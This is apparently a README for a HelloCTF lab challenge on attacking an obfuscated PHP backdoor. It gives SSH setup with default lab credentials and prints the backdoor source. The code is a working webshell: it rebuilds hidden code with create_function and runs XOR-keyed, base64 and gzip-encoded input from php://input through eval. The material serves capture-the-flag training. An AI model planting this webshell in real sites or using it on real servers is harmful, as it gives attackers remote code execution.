```bash
 ____    ______  ____       ___    ______  __      __  ____      
/\  _`\ /\__  _\/\  _`\   /'___`\ /\  _  \/\ \  __/\ \/\  _`\    
\ \ \/\_\/_/\ \/\ \ \L\_\/\_\ /\ \\ \ \L\ \ \ \/\ \ \ \ \ \/\ \  
 \ \ \/_/_ \ \ \ \ \  _\/\/_/// /__\ \  __ \ \ \ \ \ \ \ \ \ \ \ 
  \ \ \L\ \ \ \ \ \ \ \/    // /_\ \\ \ \/\ \ \ \_/ \_\ \ \ \_\ \
   \ \____/  \ \_\ \ \_\   /\______/ \ \_\ \_\ `\___x___/\ \____/
    \/___/    \/_/  \/_/   \/_____/   \/_/\/_/'\/__//__/  \/___/ 
                                                                                                                                
# @Author: 探姬
# @Date:   2024-08-26 14:34
# @Repo:   github.com/ProbiusOfficial/ctf2awd
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - ctf2awd靶场 : 攻击 - 简单混淆后门利用 --- 
```

## 配置信息

docker - ubuntu:22.04
username: `helloctf`
password: `123456`

开启题目后会得到 `IP:PORT` 信息，这里将不再能使用浏览器直接打开，你需要使用 `ssh` 连接到 GameBox 上:

```bash
ssh username@ip -p port
```

内部端口在无特殊声明的情况下均为 22 端口，由于存在 MySQL 环境，最低内存请给256，建议512。

(请开放 80 / 22 端口)

## 关于本关卡

后门源码：

```php
<?php 
/* RCE ME */
include('config.php');
highlight_file(__FILE__);
$Y='{$o.=$Pt{$i}^$k{PP$j}P;}}retPurn $o;}Pif(@preg_maPtch("/$khP(.+)$kPf/P",@file_gPePtP_contents(PP"php:/';
$j=str_replace('J','','JJcreate_JfJunJctJion');
$u='contentPs();@ob_enPd_Pclean();PP$r=P@base6P4_encode(@Px(@gPzcompress($Po),$k));Pprint("P$p$kh$Pr$kf");}';
$x='/input"P),$m)==1){@Pob_Pstart();P@ePval(@gzuPncompPresPs(@x(@bPPase64_Pdecode($Pm[1]),P$Pk)));P$o=@ob_get_';
$Z=',$k){$c=Pstrlen($Pk)P;$l=strlPen($t);P$o=P"";forP($Pi=0;$Pi<$l;){for($jP=P0;($j<$cP&&$i<$l);$jP+PP+,$i++)';
$C='$k="7Pccf819P2";$PkPh="528P2714P13977";$kf="f5415P27062PPa9";$p="ieP3xNVP9ea8twe7wPl";fuPnPction x($Pt';
$U=str_replace('P','',$C.$Z.$Y.$x.$u);
$E=$j('',$U);
$E();
?>
```

### SSH 通关方式
使用 PHP / Python 编写攻击 EXP，实现 RCE 获取flag。

### 80 端口通关方式
(我觉得不需要多说)
Flag 位于 `/flag`。